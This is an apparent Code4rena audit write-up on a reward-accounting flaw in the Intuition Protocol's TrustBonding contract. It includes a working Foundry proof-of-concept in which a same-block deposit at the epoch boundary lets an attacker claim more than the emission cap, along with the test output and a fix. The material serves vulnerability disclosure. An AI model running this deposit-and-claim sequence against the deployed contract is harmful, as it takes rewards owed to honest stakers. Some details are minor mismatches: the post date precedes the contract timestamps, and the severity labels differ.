---
layout: default
title: "Intuition Protocol - S-471"
date: 2024-03-30
tags: [code4rena]
---

### Intuition Protocol

**Severity:** Medium  

I participated in the Intuition Protocol contest and reached the top 2 out of more than a thousand participants worldwide. It took nearly four days of focused work to understand the protocol as a whole and uncover its hidden behavior.

## Summary

I found a reward-accounting issue in `TrustBonding.sol` where epoch rewards are calculated from live historical balance queries instead of a frozen end-of-epoch snapshot. Because the contract does not lock the user balance or total bonded supply when the epoch closes, a same-block `deposit_for` can update the historical checkpoint used by reward claims.

On Base L2, this becomes practical because epoch boundaries and block timestamps both land on even seconds. An attacker can deposit in the exact epoch-boundary block, inflate the checkpoint used by `userBondedBalanceAtEpochEnd()` and `totalBondedBalanceAtEpochEnd()`, and then claim a larger share than they actually earned. Repeating this breaks the epoch emission cap and can drain the emissions controller before honest users finish claiming.

## Finding Description

The reward share is computed with the following logic:

```solidity
uint256 userBalance = userBondedBalanceAtEpochEnd(account, epoch);
uint256 totalBalance = totalBondedBalanceAtEpochEnd(epoch);

return userBalance * _emissionsForEpoch(epoch) / totalBalance;
```

The issue is that neither the numerator nor the denominator is frozen when an epoch ends. Instead, both values are derived from historical lookups against the underlying `VotingEscrow` contract. If a checkpoint is written in the same block as the epoch boundary, the historical search resolves to the new checkpoint rather than the intended pre-boundary state.

That means a `deposit_for` executed at the epoch boundary can retroactively inflate the balance used for reward accounting.

## Root Cause

`TrustBonding` relies on live historical queries instead of immutable epoch snapshots.

The relevant behavior comes from the timestamp lookup rules in `VotingEscrow`:

* the search returns the latest checkpoint with `ts <= queryTimestamp`
* a checkpoint written in the epoch-boundary block shares the same timestamp as the epoch end
* the reward query therefore sees the post-deposit state, not the pre-deposit state

This affects both:

* the user balance used in the numerator
* the total bonded balance used in the denominator

## Why This Is Exploitable On Base

The attack is realistic on Base because the timing constraints are deterministic:

* `START_TIMESTAMP = 1_762_268_400`, which is even
* `EPOCH_LENGTH = 1_209_600`, which is also even
* every epoch boundary is therefore an even Unix second
* Base produces blocks every 2 seconds, which are also even timestamps

As a result, every epoch boundary can align with a Base block. That gives an attacker a reliable target for a same-block `deposit_for` plus claim sequence.

## Impact

This is not just a small rounding issue. The attacker can increase their share at the epoch boundary and push total payouts above the emission cap.

Once the controller pays out more than the available epoch emissions, later claimers can hit `InsufficientBalance` and lose their rightful rewards for that epoch. Because the claim window is limited to one epoch, the loss is permanent.

## Mathematical Illustration

Assume:

* total supply is `S`
* epoch emissions are `E`
* three users each hold `S / 3`
* the attacker deposits an additional amount `δ` in the epoch-boundary block

Before the attack, each user receives exactly one-third of the epoch emissions:

| User | Share | Reward |
| --- | --- | --- |
| Honest user | `S / 3` | `E / 3` |
| Honest user | `S / 3` | `E / 3` |
| Honest user | `S / 3` | `E / 3` |

After the same-block deposit, the attacker is evaluated against the inflated balances and receives:

* attacker claim = `(S / 3 + δ) / (S + δ) × E`

Because the attacker now receives more than the fair one-third share, the total distributed rewards become greater than `E`.

In other words, the protocol exceeds its hard emission cap.

## Proof Of Concept

I reproduced the issue with a Foundry test that:

1. funds the emissions controller
2. creates equal-sized locks for three users
3. warps to the epoch boundary
4. claims rewards for two honest users
5. performs a same-block `deposit_for` for the attacker
6. claims rewards for the attacker
7. verifies that total claimed rewards exceed the epoch emissions

### PoC Test

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.29;

import { console2 } from "forge-std/src/console2.sol";
import { ICoreEmissionsController } from "src/interfaces/ICoreEmissionsController.sol";
import { BaseTest } from "./BaseTest.t.sol";

//@audit PoC for H-1: Same-block deposit_for inflates VE snapshot causing insolvency.
contract PoCCore is BaseTest {
	//@audit lock duration well above minimum
	uint256 constant LOCK_DURATION = 2 * 365 days;
	//@audit each user bonds 100 ether
	uint256 constant BOND_AMOUNT = 100 ether;

	function setUp() public override {
		super.setUp(); //@audit deploys protocol, deals ETH, approves wrappedTrust

		//@audit fund controller to pay claims
		vm.deal(address(protocol.satelliteEmissionsController), 1_000_000 ether);

		//@audit create equal-sized locks for three users
		_createLock(users.alice, BOND_AMOUNT);
		_createLock(users.bob, BOND_AMOUNT);
		_createLock(users.charlie, BOND_AMOUNT);
	}

	//@audit executes same-block deposit to drain controller and block late claimers
	function test_H1_SolvencyBreach_SameBlockDepositAndClaim() external {
		//@audit warp to epoch boundary (guaranteed even timestamp on Base L2)
		uint256 epochEnd = protocol.trustBonding.epochTimestampEnd(0);
		vm.warp(epochEnd);

		//@audit tx lands on epoch boundary, writes point_history[K]
		protocol.trustBonding.checkpoint();

		uint256 prevEpoch = protocol.trustBonding.currentEpoch() - 1;
		require(prevEpoch == 0, "must be epoch 0");

		uint256 supplyBefore = protocol.trustBonding.totalBondedBalanceAtEpochEnd(prevEpoch);
		console2.log("=== H-1 PoC: Same-Block Deposit + Claim ===");
		console2.log("totalSupply  BEFORE deposit_for:", supplyBefore);

		//@audit honest claimers use totalSupply_OLD as denominator
		vm.prank(users.alice);
		protocol.trustBonding.claimRewards(users.alice);

		vm.prank(users.bob);
		protocol.trustBonding.claimRewards(users.bob);

		//@audit attacker deposits in SAME block (ts == epochEnd)
		//@audit writes point_history[K+1] causing _find_timestamp_epoch to return inflated supply
		vm.startPrank(users.charlie);
		protocol.wrappedTrust.approve(address(protocol.trustBonding), 1 ether);
		protocol.trustBonding.deposit_for(users.charlie, 1 ether);
		vm.stopPrank();

		uint256 supplyAfter = protocol.trustBonding.totalBondedBalanceAtEpochEnd(prevEpoch);
		console2.log("totalSupply  AFTER  deposit_for:", supplyAfter);

		//@audit attacker claims with totalSupply_NEW and inflated numerator
		vm.prank(users.charlie);
		protocol.trustBonding.claimRewards(users.charlie);

		uint256 maxEmissions = ICoreEmissionsController(
			address(protocol.satelliteEmissionsController)
		).getEmissionsAtEpoch(prevEpoch);

		uint256 aliceClaim   = protocol.trustBonding.userClaimedRewardsForEpoch(users.alice,   prevEpoch);
		uint256 bobClaim     = protocol.trustBonding.userClaimedRewardsForEpoch(users.bob,     prevEpoch);
		uint256 charlieClaim = protocol.trustBonding.userClaimedRewardsForEpoch(users.charlie, prevEpoch);
		uint256 totalClaimed = protocol.trustBonding.totalClaimedRewardsForEpoch(prevEpoch);

		console2.log("maxEmissions            :", maxEmissions);
		console2.log("alice claim             :", aliceClaim);
		console2.log("bob   claim             :", bobClaim);
		console2.log("charlie claim (inflated):", charlieClaim);
		console2.log("totalClaimed            :", totalClaimed);
		console2.log("BREACH (total - max)    :", totalClaimed > maxEmissions ? totalClaimed - maxEmissions : 0);

		//@audit assert denominator changed mid-claim-window
		assertGt(supplyAfter, supplyBefore, "A1: deposit_for must have changed epochEnd totalSupply");

		//@audit assert paid out more than available (insolvency)
		assertGt(totalClaimed, maxEmissions, "A2: totalClaimedRewards exceeded maxEmissions");

		//@audit assert attacker stole more than fair 1/3 share
		assertGt(charlieClaim, aliceClaim, "A3: charlie stole yield");

		//@audit assert 4th user would revert due to drained controller
		assertGt(totalClaimed, maxEmissions, "A4: controller drained - InsufficientBalance for late claimers");

		console2.log("=== EXPLOIT CONFIRMED: H-1 is valid ===");
	}

	//@audit helper to create locks
	function _createLock(address user, uint256 amount) internal {
		vm.startPrank(user);
		uint256 unlockTime = block.timestamp + LOCK_DURATION;
		protocol.wrappedTrust.approve(address(protocol.trustBonding), amount);
		protocol.trustBonding.create_lock(amount, unlockTime);
		vm.stopPrank();
	}
}
```

### Test Result

The test passed and confirmed the issue:

```text
Ran 1 test for tests/PoCCore.t.sol:PoCCore
[PASS] test_H1_SolvencyBreach_SameBlockDepositAndClaim() (gas: 725300)
...
totalSupply  BEFORE deposit_for: 293424652777735336836
totalSupply  AFTER  deposit_for: 294402734953668524044
maxEmissions            : 1000000000000000000000
alice claim             : 333333333333333333333
bob   claim             : 333333333333333333333
charlie claim (inflated): 335548172757491790686
totalClaimed            : 1002214839424158457352
BREACH (total - max)    : 2214839424158457352
```

The output shows that the attacker increased the epoch-end supply used for accounting and caused total claims to exceed the emission cap.

## Recommended Mitigation

The safest fix is to query one second before the epoch ends.

Because `VotingEscrow` uses a `ts <= queryTimestamp` comparison, using `epochTimestampEnd - 1` excludes checkpoints written in the boundary block and prevents both the numerator and denominator from being inflated.

### Suggested change

```solidity
function _userEligibleRewardsForEpoch(address account, uint256 epoch) internal view returns (uint256) {
	if (account == address(0)) revert TrustBonding_ZeroAddress();
	if (epoch > currentEpoch()) revert TrustBonding_InvalidEpoch();

	uint256 safeTimestamp = _epochTimestampEnd(epoch) - 1;

	uint256 userBalance = _balanceOf(account, safeTimestamp);
	uint256 totalBalance = _totalSupply(safeTimestamp);

	if (userBalance == 0 || totalBalance == 0) return 0;

	return userBalance * _emissionsForEpoch(epoch) / totalBalance;
}
```

This fixes the issue without adding new storage variables or extra gas overhead.

## Conclusion

The bug is a missing snapshot at epoch rollover. Same-block deposits can shift the historical checkpoint used for reward distribution, inflate the attacker's share, and push payouts above the available emission budget. The issue is reproducible, economically meaningful, and consistent with the medium severity and $445 reward I received.